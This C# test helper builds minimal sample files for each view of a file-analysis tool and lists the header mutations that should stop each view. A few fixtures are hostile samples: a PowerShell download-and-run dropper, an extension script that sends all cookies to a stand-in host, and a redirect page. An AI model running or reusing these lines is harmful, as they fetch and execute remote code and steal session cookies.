using System.IO.Compression;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Corvus.Core;
using Corvus.Core.Assets;
using Corvus.Tests.NativeFormats;

namespace Corvus.Tests;

/// <summary>A minimal file each summarize_file view applies to, and the header fields that stop it.</summary>
internal static class FileViewInstances
{
    /// <summary>A view's instance: writes its file into a folder and returns the path.</summary>
    internal sealed record Instance(Func<string, string> Place);

    private static Instance Single(string name, Func<byte[]> bytes) => new(folder =>
    {
        var path = Path.Combine(folder, name);
        File.WriteAllBytes(path, bytes());
        return path;
    });

    private static byte[] FixtureFile(string relative) => File.ReadAllBytes(Path.Combine(AppContext.BaseDirectory, relative));

    private static byte[] Text(string text) => Encoding.UTF8.GetBytes(text);

    private static byte[] Zip(params (string Name, string Text)[] entries) => ContainerFixtures.Zip([.. entries.Select(e => (e.Name, Text(e.Text)))]);

    private static byte[] Pem()
    {
        using var key = RSA.Create(2048);
        var request = new CertificateRequest("CN=Example Root", key, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
        using var cert = request.CreateSelfSigned(DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(30));
        return Text(cert.ExportCertificatePem());
    }

    private static byte[] Ipa()
    {
        var plist = "<?xml version=\"1.0\"?><plist version=\"1.0\"><dict><key>CFBundleIdentifier</key><string>com.example.zoo</string>" +
            "<key>CFBundleExecutable</key><string>Zoo</string><key>CFBundleShortVersionString</key><string>1.2</string></dict></plist>";
        return ContainerFixtures.Zip(("Payload/Zoo.app/Info.plist", Text(plist)), ("Payload/Zoo.app/Zoo", FormatWriterTests.SampleMachO().Build()));
    }

    private static byte[] AssetFile()
    {
        var w = new AssetFileWriter(22, typeTrees: false);
        w.Types.Add(new(SerializedFile.ClassMonoScript, -1, null));
        w.Objects.Add((1, 0, new AssetFileWriter.Data().String("Sensor").I32(0).Zero(16).String("Sensor").String("").String("Assembly-CSharp.dll").ToArray()));
        return w.Build();
    }

    private static byte[] GoImage() => new ElfWriter
    {
        Machine = ElfWriter.EmX64, Type = 2, Base = 0x400000, Entry = ElfWriter.TextRva, Text = [0xC3], Hash = ElfWriter.HashKind.None,
        DataSectionName = ".go.buildinfo", Data = GoBuildInfoTests.Inline(),
    }.Build();

    private static byte[] ProtobufImage()
    {
        var writer = FormatWriterTests.SampleMachO();
        writer.ExtraSections = [("__TEXT", "__const", 0x2000, ProtoWriter.Demo(), 0)];
        return writer.Build();
    }

    private static byte[] SideloadBundle() => ContainerFixtures.Zip(("bin/app.exe", SideloadTests.Signed(SideloadTests.Importer("plugin.dll"))), ("bin/plugin.dll", SideloadTests.Library("plugin.dll")));

    private static byte[] FirmwareImage() => FirmwareViewTests.Image();

    private static string LevelDbFolder(string folder)
    {
        var source = Path.Combine(AppContext.BaseDirectory, "Databases", "LevelDbFixtures", "ledger-none");
        foreach (var f in Directory.GetFiles(source)) File.Copy(f, Path.Combine(folder, Path.GetFileName(f)), true);
        return Path.Combine(folder, "CURRENT");
    }

    private static byte[] EseHead()
    {
        using var z = new GZipStream(File.OpenRead(Path.Combine(AppContext.BaseDirectory, "Databases", "EseFixtures", "ledger-8k.edb.gz")), CompressionMode.Decompress);
        var o = new MemoryStream();
        z.CopyTo(o);
        // The pages after the last used one carry no data.
        return o.ToArray()[..(8192 * 72)];
    }

    private static byte[] Sqlite(params string[] statements) => NativeSqlite.Build(statements);

    private static byte[] Hive() => new HiveSamples { Minor = 5 }.Build(RegistryHiveTests.Sample());

    private static byte[] Capture() => PcapTests.Pcap(PcapTests.Packets());

    private static byte[] RustImage() => RustAuditTests.Elf(RustAuditTests.Zlib(RustAuditTests.Json));

    private static byte[] Models() => ModelSamples.Safetensors("""{"a":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}""", 4);

    private static byte[] Nib() => NibViewTests.Nib(("UIButton", [("UILabel", "go:"), ("UITag", 3L)]),
        ("UIRuntimeEventConnection", [("UILabel", "go:"), ("UISource", 0), ("UIDestination", 0)]));

    private static byte[] ProcessLog() => ProcmonSamples.Log(ProcmonTests.SampleEvents());

    private static byte[] EventLog() => EvtxSamples.Log([EvtxTests.Sample(1)]);

    private static byte[] ScriptPage() => Text("<!doctype html><meta http-equiv=\"refresh\" content=\"0;url=https://c.example/\"><script>location.href='https://d.example/'</script>");

    private static byte[] Extension() => PackageReviewTests.Crx3(Zip(
        ("manifest.json", """{"manifest_version":3,"name":"x","version":"1","permissions":["cookies"],"host_permissions":["<all_urls>"],"background":{"service_worker":"b.js"}}"""),
        ("b.js", "chrome.cookies.getAll({}, c => fetch('https://a.example/c', {method:'POST'}));")), out _);

    /// <summary>The views with a minimal instance, by name.</summary>
    internal static Dictionary<string, Instance> All() => new()
    {
        ["android"] = Single("app.apk", () => AndroidSamples.Apk()),
        ["apple"] = Single("Zoo.ipa", Ipa),
        ["assets"] = Single("level0", AssetFile),
        ["berkeleydb"] = Single("ledger.db", () => FixtureFile("Databases/BerkeleyDbFixtures/ledger.db")),
        ["certificate"] = Single("ca.pem", Pem),
        ["electron"] = Single("app.asar", () => AsarWriter.Build([AsarWriter.Text("package.json", """{"name":"demo","main":"main.js"}""")]).Item1),
        ["ese"] = Single("ledger.edb", EseHead),
        ["esp32"] = Single("flash.bin", () => Esp32Samples.Flash(NvsWriter.Sample().Writer.Build())),
        ["evtx"] = Single("sample.evtx", EventLog),
        ["firmware"] = Single("fw.bin", FirmwareImage),
        ["flight"] = Single("index.rsc", () => Text("1:\"$Sreact.fragment\"\n2:I[9766,[],\"\"]\n4:I[5675,[\"974\",\"static/chunks/app/page-e190.js\"],\"default\"]\n")),
        ["flutter"] = Single("libapp.so", FlutterViewTests.App),
        ["go"] = Single("gobin", GoImage),
        ["harmony"] = Single("app.hap", () => Zip(("module.json", HarmonyPackageTests.StageProfile))),
        ["hermes"] = Single("sample.hbc", FileKindValidityTests.Instances()["hermes bytecode"]),
        ["installer"] = Single("sample.msi", () => InstallerTests.Fixture("sample.msi")),
        ["layers"] = Single("app.apk", () => Zip(("AndroidManifest.xml", "<manifest/>"))),
        ["leveldb"] = new(LevelDbFolder),
        ["lmdb"] = Single("ledger.mdb", () => FixtureFile("Databases/LmdbFixtures/ledger.mdb")),
        ["lnk"] = Single("sample.lnk", FileKindValidityTests.Instances()["lnk shortcut"]),
        ["lockfile"] = Single("package-lock.json", () => Text("""{"lockfileVersion":3,"packages":{"":{"name":"a"},"node_modules/b":{"version":"1.0.0","resolved":"https://registry.npmjs.org/b/-/b-1.0.0.tgz","integrity":"sha512-AAAA"}}}""")),
        ["mail"] = Single("sample.eml", MailMessageTests.Eml),
        ["model"] = Single("model.safetensors", Models),
        ["msix"] = Single("tool.msix", () => Zip(("AppxManifest.xml", "<Package><Identity Name=\"Example.Tool\" Publisher=\"CN=Example\" Version=\"1.0.0.0\"/></Package>"))),
        ["native"] = Single("lib.bin", () => NativePeTests.KitchenSink(true)),
        ["nib"] = Single("main.nib", Nib),
        ["office"] = Single("report.doc", OfficeDocumentTests.WordDocument),
        ["package"] = Single("ext.crx", Extension),
        ["page"] = Single("page.html", ScriptPage),
        ["pcap"] = Single("sample.pcap", Capture),
        ["pdf"] = Single("sample.pdf", () => Text(string.Join("\n", "%PDF-1.4", "1 0 obj", "<< /Type /Catalog >>", "endobj", "trailer", "<< /Root 1 0 R >>", "%%EOF", ""))),
        ["plist"] = Single("Info.plist", () => Text("<?xml version=\"1.0\"?><plist><dict><key>a</key><array><integer>1</integer><data>AAEC</data></array></dict></plist>")),
        ["pri"] = Single("resources.pri", () => FixtureFile("Containers/PriFixtures/notes.pri")),
        ["procmon"] = Single("sample.pml", ProcessLog),
        ["protobuf"] = Single("demo", ProtobufImage),
        ["python"] = Single("m.pyc", FileKindValidityTests.Instances()["python bytecode"]),
        ["raw"] = Single("sample.bin", () => RawCodeFixtures.Repeated(RawCodeFixtures.Built().First(f => f.Arch == "arm64").Code)),
        ["qlog"] = Single("sample.qlog", () => Text("""{"qlog_version":"0.3","qlog_format":"JSON","traces":[]}""")),
        ["realm"] = Single("ledger.realm", () => FixtureFile("Databases/RealmFixtures/ledger.realm")),
        ["registry"] = Single("SOFTWARE", Hive),
        ["rust"] = Single("tool", RustImage),
        ["script"] = Single("drop.ps1", () => Text("Invoke-WebRequest -Uri http://example.com/a.exe -OutFile $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe")),
        ["shell"] = Single("a.url", () => Text("[InternetShortcut]\r\nURL=search-ms:query=x\r\nIconFile=C:\\x.ico\r\n")),
        ["sideload"] = Single("bundle.zip", SideloadBundle),
        ["sqlite"] = Single("app.db", () => Sqlite("CREATE TABLE t(a INTEGER);", "INSERT INTO t VALUES (1), (2);")),
        ["sqlite-recover"] = Single("msg.db", () => Sqlite("CREATE TABLE msg(id INTEGER PRIMARY KEY, body TEXT);", "INSERT INTO msg(body) VALUES ('one'), ('two'), ('three');", "DELETE FROM msg WHERE id = 2;")),
        ["wasm"] = Single("sample.wasm", FileKindValidityTests.Instances()["wasm"]),
        ["xbf"] = Single("Page.xbf", XbfTests.Page),
    };

    /// <summary>Views with no header field to change, with the gate each one reads instead.</summary>
    internal static readonly Dictionary<string, string> NotMagicGated = new()
    {
        ["electron"] = "gated on an archive entry",
        ["firmware"] = "gated on signatures found at any offset",
        ["raw"] = "gated on instruction statistics; RawCodeValidityTests checks random data",
        ["flight"] = "gated on text content",
        ["leveldb"] = "gated on a folder's files",
        ["lockfile"] = "gated on the file name",
        ["mail"] = "gated on text headers",
        ["package"] = "gated on an archive entry",
        ["page"] = "gated on text content",
        ["plist"] = "gated on text content",
        ["script"] = "gated on text content",
        ["shell"] = "gated on text content",
        ["sideload"] = "gated on archive entries",
    };

    /// <summary>Single-field changes, as (offset, value), each of which must stop the view.</summary>
    internal static Dictionary<string, (int At, byte Value)[]> Mutations() => new()
    {
        ["android"] = [(0, 0)],
        ["installer"] = [(0, 0)],
        ["lmdb"] = [(16, 0)],
        ["python"] = [(0, 0)],
        ["office"] = [(0, 0)],
        ["assets"] = [(8, 0xFF)],
        ["model"] = [(0, 0)],
        ["esp32"] = [(0, 0)],
        ["apple"] = [(0, 0)],
        ["berkeleydb"] = [(12, 0)],
        ["certificate"] = [(0, (byte)'X')],
        ["ese"] = [(4, 0)],
        ["evtx"] = [(0, (byte)'X')],
        ["flutter"] = [(0, 0)],
        ["go"] = [(0, 0)],
        ["harmony"] = [(0, 0)],
        ["hermes"] = [(0, 0)],
        ["layers"] = [(0, 0)],
        ["lnk"] = [(0, 0)],
        ["msix"] = [(0, 0)],
        ["native"] = [(0, 0)],
        ["nib"] = [(0, (byte)'X')],
        ["pcap"] = [(0, 0)],
        ["pdf"] = [(0, (byte)'X')],
        ["pri"] = [(0, (byte)'X')],
        ["procmon"] = [(0, (byte)'X')],
        ["protobuf"] = [(0, 0)],
        ["qlog"] = [(0, (byte)'[')],
        ["realm"] = [(16, (byte)'X')],
        ["registry"] = [(0, (byte)'X')],
        ["rust"] = [(0, 0)],
        ["sqlite"] = [(0, (byte)'X')],
        ["sqlite-recover"] = [(0, (byte)'X')],
        ["wasm"] = [(0, 1)],
        ["xbf"] = [(0, (byte)'Y')],
    };
}
